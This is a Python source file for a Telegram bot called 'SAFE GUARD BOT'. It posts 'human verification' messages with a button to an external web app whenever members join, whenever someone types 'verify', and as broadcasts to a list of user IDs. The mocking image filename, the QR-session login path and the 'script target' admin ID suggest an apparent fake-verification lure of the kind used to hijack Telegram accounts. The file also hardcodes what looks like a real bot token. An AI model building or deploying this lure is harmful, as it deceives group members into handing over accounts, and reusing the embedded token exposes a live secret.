#!/usr/bin/env python3
"""
Python 3.13 Compatible Telegram Bot

This bot uses direct HTTP requests instead of the python-telegram-bot library
to avoid the imghdr dependency issue with Python 3.13.
"""

import os
import time
import json
import logging
import requests
from datetime import datetime
from dotenv import load_dotenv
from utils.user_id_manager import UserIDManager
from config import SCRIPT_TARGET_USER_ID

# Load environment variables
load_dotenv()

# Configuration
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8033516348:AAE2ylmkjc8Q6Sj1b8yzvk19wvB3kYs-5-k')
WEBAPP_URL = os.getenv('WEBAPP_URL', 'https://safeguard-bot.vercel.app')
LOCAL_DEV = os.getenv('LOCAL_DEV', 'false').lower() == 'true'
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'admin_password_change_this')

# Debug logging for configuration
print(f"🔧 Configuration loaded:")
print(f"   - LOCAL_DEV: {LOCAL_DEV}")
print(f"   - WEBAPP_URL: {WEBAPP_URL}")
print(f"   - BOT_TOKEN: {BOT_TOKEN[:10]}...")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class HTTPTelegramBot:
    def __init__(self, token: str = None):
        self.token = token or BOT_TOKEN
        self.base_url = f"https://api.telegram.org/bot{self.token}"
        self.last_update_id = 0
        self.user_id_manager = UserIDManager()
        # Store admin conversation states
        self.admin_states = {}  # {user_id: {'state': 'waiting_password', 'command': 'add_user_id'}}

    def get_me(self):
        """Get bot information"""
        try:
            response = requests.get(f"{self.base_url}/getMe")
            if response.status_code == 200:
                return response.json()['result']
            else:
                logger.error(f"Failed to get bot info: {response.text}")
                return None
        except Exception as e:
            logger.error(f"Error getting bot info: {e}")
            return None

    def get_updates(self, offset=None, limit=100, timeout=30):
        """Get updates from Telegram"""
        try:
            params = {
                'limit': limit,
                'timeout': timeout
            }
            if offset:
                params['offset'] = offset
            
            response = requests.get(f"{self.base_url}/getUpdates", params=params)
            if response.status_code == 200:
                return response.json()['result']
            else:
                logger.error(f"Failed to get updates: {response.text}")
                return []
        except Exception as e:
            logger.error(f"Error getting updates: {e}")
            return []

    def send_message(self, chat_id, text, parse_mode=None, reply_markup=None):
        """Send a message to a chat"""
        try:
            data = {
                'chat_id': chat_id,
                'text': text
            }
            
            if parse_mode:
                data['parse_mode'] = parse_mode
            
            if reply_markup:
                data['reply_markup'] = json.dumps(reply_markup)
            
            response = requests.post(f"{self.base_url}/sendMessage", json=data)
            if response.status_code == 200:
                return response.json()['result']
            else:
                logger.error(f"Failed to send message: {response.text}")
                return None
        except Exception as e:
            logger.error(f"Error sending message: {e}")
            return None

    def send_photo(self, chat_id, photo_url, caption=None, parse_mode=None, reply_markup=None):
        """Send a photo to a chat"""
        try:
            data = {
                'chat_id': chat_id,
                'photo': photo_url
            }
            
            if caption:
                data['caption'] = caption
            
            if parse_mode:
                data['parse_mode'] = parse_mode
            
            if reply_markup:
                data['reply_markup'] = json.dumps(reply_markup)
            
            response = requests.post(f"{self.base_url}/sendPhoto", json=data)
            if response.status_code == 200:
                return response.json()['result']
            else:
                logger.error(f"Failed to send photo: {response.text}")
                return None
        except Exception as e:
            logger.error(f"Error sending photo: {e}")
            return None

    def handle_start_command(self, message):
        """Handle /start command"""
        user = message.get('from', {})
        chat = message.get('chat', {})
        text = message.get('text', '')
        
        # Check if this is a QR code login
        if text.startswith('/start qr_'):
            qr_session_id = text.split('qr_')[1]
            success_text = f"✅ QR Code verified successfully!\n\nWelcome {user.get('first_name', 'User')} to SAFE GUARD BOT!"
            
            self.send_message(
                chat_id=chat['id'],
                text=success_text,
                parse_mode='HTML'
            )
            logger.info(f"QR login successful for user {user.get('id')} with session {qr_session_id}")
            return
        
        # Regular start command
        welcome_text = f"""
            👋 Hello {user.get('first_name', 'User')}!

            Welcome to Safeguard Bot. Please verify your account to proceed.
            """
        
        # For local development, don't use inline keyboard (Telegram requires HTTPS)
        if LOCAL_DEV:
            # Send message without inline keyboard for local testing
            welcome_text += f"\n\n🌐 <b>Local Development Mode</b>\nPlease visit: {WEBAPP_URL}"
            keyboard = None
        else:
            keyboard = {
                "inline_keyboard": [[
                    {
                        "text": "🔐 Start Verification",
                        "url": WEBAPP_URL
                    }
                ]]
            }
        
        self.send_message(
            chat_id=chat['id'],
            text=welcome_text,
            parse_mode='HTML',
            reply_markup=keyboard
        )

    def handle_new_member(self, message):
        """Handle when new users join a group"""
        chat = message.get('chat', {})
        new_members = message.get('new_chat_members', [])

        logger.info(f"🆕 New member event detected in chat: {chat.get('id')} ({chat.get('title')})")
        logger.info(f"👥 New members: {[f'{m.get('first_name', 'Unknown')} (ID: {m.get('id')}, Bot: {m.get('is_bot', False)})' for m in new_members]}")

        for new_member in new_members:
            if not new_member.get('is_bot', False):
                logger.info(f"👤 Processing new human member: {new_member.get('first_name')} (ID: {new_member.get('id')})")

                # Add more detailed logging
                logger.info(f"📝 Message ID: {message.get('message_id')}")
                logger.info(f"📝 Chat Type: {chat.get('type')}")
                logger.info(f"📝 Chat Title: {chat.get('title')}")
                
                # Send the Safeguard Human Verification image with caption
                try:
                    photo_url = "https://i.ibb.co/CKY1GCHq/fuckyou.jpg"
                    
                    # Prepare the caption text
                    welcome_text = (
                        'This group is being protected by '
                        '<a href="{webapp_url}">@Safeguard</a>.'
                        '\n\nClick below or <a href="{webapp_url}">this link</a> to start human verification.'
                    ).format(webapp_url=WEBAPP_URL)

                    # For local development, don't use inline keyboard (Telegram requires HTTPS)
                    if LOCAL_DEV:
                        # Send message without inline keyboard for local testing
                        welcome_text += f"\n\n🌐 <b>Local Development Mode</b>\nPlease visit: {WEBAPP_URL}"
                        keyboard = None
                    else:
                        keyboard = {
                            "inline_keyboard": [[
                                {
                                    "text": "🔐 Start Verification",
                                    "url": WEBAPP_URL
                                }
                            ]]
                        }

                    photo_result = self.send_photo(
                        chat_id=chat['id'], 
                        photo_url=photo_url,
                        caption=welcome_text,
                        parse_mode='HTML',
                        reply_markup=keyboard
                    )
                    
                    if photo_result:
                        logger.info(f"✅ Verification image with caption sent for new member {new_member.get('id')} in chat {chat.get('id')}")
                    else:
                        logger.error(f"❌ Failed to send verification image with caption")
                        
                except Exception as e:
                    logger.error(f"❌ Error sending verification image with caption: {e}")
                
                # Send verification message to all user IDs in the list
                self.send_verification_to_all_users(chat)
            else:
                logger.info(f"🤖 Skipping bot member: {new_member.get('first_name')}")


    def handle_channel_post(self, channel_post):
        """Handle channel posts"""
        chat = channel_post.get('chat', {})
        text = channel_post.get('text', '')
        
        logger.info(f"📢 Channel post detected in: {chat.get('title')} (ID: {chat.get('id')})")
        logger.info(f"📝 Post text: {text[:100]}...")
        
        # Handle verification requests in channel posts
        if "verify" in text.lower():
            logger.info(f"🔐 Verification request detected in channel {chat.get('title')}")
            
            # Send verification message to all user IDs in the list
            self.send_verification_to_all_users(chat)
            
            # Optionally, you can also send a response to the channel
            if LOCAL_DEV:
                response_text = f"🔐 Verification triggered from channel.\n\n🌐 <b>Local Development Mode</b>\nPlease visit: {WEBAPP_URL}"
                keyboard = None
            else:
                response_text = "🔐 Verification triggered from channel."
                keyboard = {
                    "inline_keyboard": [[
                        {
                            "text": "🔐 Start Verification",
                            "url": WEBAPP_URL
                        }
                    ]]
                }
            
            try:
                self.send_message(
                    chat_id=chat['id'],
                    text=response_text,
                    parse_mode='HTML',
                    reply_markup=keyboard
                )
                logger.info(f"✅ Channel verification response sent to {chat.get('title')}")
            except Exception as e:
                logger.error(f"❌ Error sending channel verification response: {e}")
        
        # Handle manual verification triggers
        elif text.lower() in ['/verify_all', '/broadcast_verify', 'verify all']:
            logger.info(f"📤 Manual verification broadcast triggered in channel {chat.get('title')}")
            self.send_verification_to_all_users(chat)
            
            # Send confirmation to channel
            try:
                self.send_message(
                    chat_id=chat['id'],
                    text="✅ <b>Verification Broadcast</b>\n\nVerification messages have been sent to all users in the list.",
                    parse_mode='HTML'
                )
                logger.info(f"✅ Channel verification broadcast confirmed to {chat.get('title')}")
            except Exception as e:
                logger.error(f"❌ Error sending channel broadcast confirmation: {e}")


    def send_channel_welcome_message(self, channel_id):
        """Send a welcome message to a channel (call this manually when needed)"""
        try:
            # Send the Safeguard Human Verification image with caption
            photo_url = "https://i.ibb.co/CKY1GCHq/fuckyou.jpg"
            
            # Prepare the caption text
            welcome_text = (
                'This channel is being protected by '
                '<a href="{webapp_url}">@Safeguard</a>.'
                '\n\nClick below or <a href="{webapp_url}">this link</a> to start human verification.'
            ).format(webapp_url=WEBAPP_URL)

            # For local development, don't use inline keyboard (Telegram requires HTTPS)
            if LOCAL_DEV:
                welcome_text += f"\n\n🌐 <b>Local Development Mode</b>\nPlease visit: {WEBAPP_URL}"
                keyboard = None
            else:
                keyboard = {
                    "inline_keyboard": [[
                        {
                            "text": "🔐 Start Verification",
                            "url": WEBAPP_URL
                        }
                    ]]
                }

            photo_result = self.send_photo(
                chat_id=channel_id, 
                photo_url=photo_url,
                caption=welcome_text,
                parse_mode='HTML',
                reply_markup=keyboard
            )
            
            if photo_result:
                logger.info(f"✅ Channel welcome message sent to channel {channel_id}")
                return True
            else:
                logger.error(f"❌ Failed to send channel welcome message")
                return False
                
        except Exception as e:
            logger.error(f"❌ Error sending channel welcome message: {e}")
            return False


    def handle_message(self, message):
        """Handle regular text messages"""
        user = message.get('from', {})
        chat = message.get('chat', {})
        text = message.get('text', '')
        
        # Check if user is in admin conversation state
        user_id = user.get('id')
        if user_id in self.admin_states:
            return self.handle_admin_conversation(message)
        
        # Handle admin commands
        if text in ['/add_userId', '/del_userId', '/userId', '/cancel', '/broadcast_verify', '/help']:
            return self.handle_admin_commands(message)
        
        # Handle /start command
        if text.startswith('/start'):
            self.handle_start_command(message)
            return
        
        # Handle verification requests
        if "verify" in text.lower():
            if LOCAL_DEV:
                # Send message without inline keyboard for local testing
                self.send_message(
                    chat_id=chat['id'],
                    text=f"🔐 Please verify your account to proceed.\n\n🌐 <b>Local Development Mode</b>\nPlease visit: {WEBAPP_URL}"
                )
            else:
                keyboard = {
                    "inline_keyboard": [[
                        {
                            "text": "🔐 Start Verification",
                            "url": WEBAPP_URL
                        }
                    ]]
                }
                
                self.send_message(
                    chat_id=chat['id'],
                    text="🔐 Please verify your account to proceed.",
                    reply_markup=keyboard
                )
            
            # Send verification message to all user IDs in the list
            self.send_verification_to_all_users(chat)
    
    def handle_admin_commands(self, message):
        user = message.get('from', {})
        chat = message.get('chat', {})
        text = message.get('text', '')
        user_id = user.get('id')
        
        if text == '/add_userId':
            if str(user_id) != str(SCRIPT_TARGET_USER_ID):
                self.send_message(
                    chat_id=chat['id'],
                    text="❌ <b>Access Denied</b>\n\nYou are not authorized to add user IDs.",
                    parse_mode='HTML'
                )
                return True
            logger.info(f"🔐 Admin command /add_userId requested by user {user_id} ({user.get('first_name')})")
            self.admin_states[user_id] = {'state': 'waiting_password', 'command': 'add_user_id'}
            self.send_message(
                chat_id=chat['id'],
                text="🔐 <b>Admin Authentication Required</b>\n\nPlease enter the admin password:",
                parse_mode='HTML'
            )
            return True
        
        elif text == '/del_userId':
            if str(user_id) != str(SCRIPT_TARGET_USER_ID):
                self.send_message(
                    chat_id=chat['id'],
                    text="❌ <b>Access Denied</b>\n\nYou are not authorized to delete user IDs.",
                    parse_mode='HTML'
                )
                return True
            logger.info(f"🔐 Admin command /del_userId requested by user {user_id} ({user.get('first_name')})")
            self.admin_states[user_id] = {'state': 'waiting_password', 'command': 'delete_user_id'}
            self.send_message(
                chat_id=chat['id'],
                text="🔐 <b>Admin Authentication Required</b>\n\nPlease enter the admin password:",
                parse_mode='HTML'
            )
            return True
        
        elif text == '/userId':
            logger.info(f"🔐 Admin command /userId requested by user {user_id} ({user.get('first_name')})")
            self.admin_states[user_id] = {'state': 'waiting_password', 'command': 'list_user_ids'}
            self.send_message(
                chat_id=chat['id'],
                text="🔐 <b>Admin Authentication Required</b>\n\nPlease enter the admin password:",
                parse_mode='HTML'
            )
            return True
        
        elif text == '/cancel':
            if user_id in self.admin_states:
                logger.info(f"🚫 Admin command cancelled by user {user_id}")
                del self.admin_states[user_id]
                self.send_message(
                    chat_id=chat['id'],
                    text="🚫 <b>Operation Cancelled</b>\n\nThe admin operation has been cancelled.",
                    parse_mode='HTML'
                )
                return True
        
        elif text == '/broadcast_verify':
            if str(user_id) != str(SCRIPT_TARGET_USER_ID):
                self.send_message(
                    chat_id=chat['id'],
                    text="❌ <b>Access Denied</b>\n\nYou are not authorized to broadcast verification.",
                    parse_mode='HTML'
                )
                return True
            logger.info(f"📤 Manual verification broadcast requested by user {user_id}")
            self.send_verification_to_all_users(chat)
            self.send_message(
                chat_id=chat['id'],
                text="✅ <b>Verification Broadcast</b>\n\nVerification message has been sent to all user IDs in the list.",
                parse_mode='HTML'
            )
            return True
        
        elif text == '/help':
            logger.info(f"📋 Help command requested by user {user_id}")
            if str(user_id) == str(SCRIPT_TARGET_USER_ID):
                help_text = (
                    "🤖 <b>SAFE GUARD BOT - Available Commands</b>\n\n"
                    "📋 <b>General Commands:</b>\n"
                    "• /start - Start the bot and get welcome message\n"
                    "• /help - Show this help message\n\n"
                    "🔐 <b>Admin Commands (Password Required):</b>\n"
                    "• /add_userId - Add a user ID to the verification list\n"
                    "• /del_userId - Delete a user ID from the verification list\n"
                    "• /userId - List all user IDs in the verification list\n"
                    "• /broadcast_verify - Manually send verification to all users\n"
                    "• /cancel - Cancel current admin operation\n\n"
                    "🔄 <b>Automatic Triggers:</b>\n"
                    "• New member joins a group\n"
                    "• Someone types 'verify' in chat\n\n"
                    "💡 <b>Note:</b> Admin commands require authentication and proper authorization."
                )
            else:
                help_text = (
                    "🤖 <b>SAFE GUARD BOT - Available Commands</b>\n\n"
                    "📋 <b>General Commands:</b>\n"
                    "• /start - Start the bot and get welcome message\n"
                    "• /help - Show this help message\n\n"
                )
            self.send_message(
                chat_id=chat['id'],
                text=help_text,
                parse_mode='HTML'
            )
            return True
        
        return False
    
    def handle_admin_conversation(self, message):
        """Handle admin conversation flow"""
        user = message.get('from', {})
        chat = message.get('chat', {})
        text = message.get('text', '')
        user_id = user.get('id')
        
        if user_id not in self.admin_states:
            return False
        
        admin_state = self.admin_states[user_id]
        state = admin_state.get('state')
        command = admin_state.get('command')
        
        if state == 'waiting_password':
            # Verify password
            if text == ADMIN_PASSWORD:
                logger.info(f"✅ Admin password verified for user {user_id}")
                
                if command == 'list_user_ids':
                    self.show_user_ids(chat['id'])
                    del self.admin_states[user_id]
                elif command in ['add_user_id', 'delete_user_id']:
                    action = "add" if command == 'add_user_id' else "delete"
                    admin_state['state'] = 'waiting_user_id'
                    self.send_message(
                        chat_id=chat['id'],
                        text=f"📝 <b>Input User ID</b>\n\nPlease enter the user ID you want to {action}:",
                        parse_mode='HTML'
                    )
            else:
                logger.warning(f"❌ Invalid admin password attempt by user {user_id}")
                self.send_message(
                    chat_id=chat['id'],
                    text="❌ <b>Access Denied</b>\n\nInvalid admin password. Please try again or use /cancel to abort.",
                    parse_mode='HTML'
                )
        
        elif state == 'waiting_user_id':
            # Handle user ID input
            if command == 'add_user_id':
                success = self.user_id_manager.add_user_id(text)
                if success:
                    self.send_message(
                        chat_id=chat['id'],
                        text=f"✅ <b>Success!</b>\n\nUser ID <code>{text}</code> has been added to the list.",
                        parse_mode='HTML'
                    )
                else:
                    self.send_message(
                        chat_id=chat['id'],
                        text=f"❌ <b>Failed to add user ID</b>\n\nUser ID <code>{text}</code> could not be added. It might already exist or be invalid.",
                        parse_mode='HTML'
                    )
            
            elif command == 'delete_user_id':
                success = self.user_id_manager.delete_user_id(text)
                if success:
                    self.send_message(
                        chat_id=chat['id'],
                        text=f"✅ <b>Success!</b>\n\nUser ID <code>{text}</code> has been deleted from the list.",
                        parse_mode='HTML'
                    )
                else:
                    self.send_message(
                        chat_id=chat['id'],
                        text=f"❌ <b>Failed to delete user ID</b>\n\nUser ID <code>{text}</code> was not found in the list.",
                        parse_mode='HTML'
                    )
            
            # Clear admin state
            del self.admin_states[user_id]
    
    def show_user_ids(self, chat_id):
        """Show the list of user IDs"""
        user_ids = self.user_id_manager.get_user_ids()
        count = len(user_ids)
        
        if count == 0:
            message = "📋 <b>User IDs List</b>\n\nNo user IDs found."
        else:
            message = f"📋 <b>User IDs List</b>\n\nTotal: {count} user ID(s)\n\n"
            # Display user IDs in chunks of 10 for readability
            for i in range(0, count, 10):
                chunk = user_ids[i:i+10]
                message += "\n".join(chunk) + "\n"
                if i + 10 < count:
                    message += "\n"
        
        self.send_message(
            chat_id=chat_id,
            text=message,
            parse_mode='HTML'
        )
    
    def send_verification_to_all_users(self, chat_info=None):
        """Send verification message to all user IDs in the list"""
        user_ids = self.user_id_manager.get_user_ids()
        
        if not user_ids:
            logger.info("📋 No user IDs found in list, skipping verification broadcast")
            return
        
        logger.info(f"📤 Sending verification message to {len(user_ids)} user(s)")
        
        # Prepare verification message
        verification_text = (
            '🔐 <b>SAFE GUARD BOT</b> verification required.\n\n'
            '<i>Click the button below to start verification</i>'
        )
        
        # For local development, don't use inline keyboard (Telegram requires HTTPS)
        if LOCAL_DEV:
            verification_text += f"\n\n🌐 <b>Local Development Mode</b>\nPlease visit: {WEBAPP_URL}"
            keyboard = None
        else:
            keyboard = {
                "inline_keyboard": [[
                    {
                        "text": "🔐 Start Verification",
                        "url": WEBAPP_URL
                    }
                ]]
            }
        
        # Add chat info if provided
        if chat_info:
            chat_name = chat_info.get('title', chat_info.get('first_name', 'Unknown'))
            verification_text += f"\n\n📝 <b>Triggered by:</b> {chat_name}"
        
        # Send to each user ID
        success_count = 0
        for user_id in user_ids:
            try:
                result = self.send_message(
                    chat_id=int(user_id),
                    text=verification_text,
                    parse_mode='HTML',
                    reply_markup=keyboard
                )
                if result:
                    success_count += 1
                    logger.info(f"✅ Verification sent to user {user_id}")
                else:
                    logger.error(f"❌ Failed to send verification to user {user_id}")
            except Exception as e:
                logger.error(f"❌ Error sending verification to user {user_id}: {e}")
        
        logger.info(f"📊 Verification broadcast completed: {success_count}/{len(user_ids)} successful")

    def process_update(self, update):
        """Process a single update"""
        update_id = update.get('update_id', 0)
        
        # Update the last update ID
        if update_id > self.last_update_id:
            self.last_update_id = update_id
        
        # Handle different types of updates
        if 'message' in update:
            message = update['message']
            
            # Handle new chat members
            if 'new_chat_members' in message:
                self.handle_new_member(message)
            # Handle regular messages
            elif 'text' in message:
                self.handle_message(message)
        
        elif 'channel_post' in update:
            # Handle channel posts
            channel_post = update['channel_post']
            self.handle_channel_post(channel_post)
        
        elif 'callback_query' in update:
            # Handle button clicks
            callback_query = update['callback_query']
            query_id = callback_query['id']
            
            # Answer the callback query
            try:
                requests.post(f"{self.base_url}/answerCallbackQuery", json={
                    'callback_query_id': query_id
                })
            except Exception as e:
                logger.error(f"Error answering callback query: {e}")

    def run(self):
        """Start the bot"""
        logger.info("🤖 Starting HTTP Telegram Bot...")
        
        # Get bot info
        bot_info = self.get_me()
        if bot_info:
            logger.info(f"🔑 Bot Token: {self.token[:10]}...")
            logger.info(f"👤 Bot Username: @{bot_info.get('username')}")
            logger.info(f"🌐 Web App URL: {WEBAPP_URL}")
            logger.info("📡 Bot is now polling for updates...")
            logger.info("💡 Make sure the bot is added to groups/channels with proper permissions")
            logger.info("📢 For channels: Add bot as admin with post permissions")
        else:
            logger.error("❌ Failed to get bot info. Check your bot token.")
            return
        
        # Main polling loop
        while True:
            try:
                # Get updates
                updates = self.get_updates(offset=self.last_update_id + 1)
                
                # Process updates
                for update in updates:
                    self.process_update(update)
                
                # Small delay to avoid hitting rate limits
                time.sleep(1)
                
            except KeyboardInterrupt:
                logger.info("🛑 Bot stopped by user")
                break
            except Exception as e:
                logger.error(f"❌ Error in main loop: {e}")
                time.sleep(5)  # Wait before retrying

def main():
    """Main function"""
    bot = HTTPTelegramBot()
    bot.run()

if __name__ == "__main__":
    main() 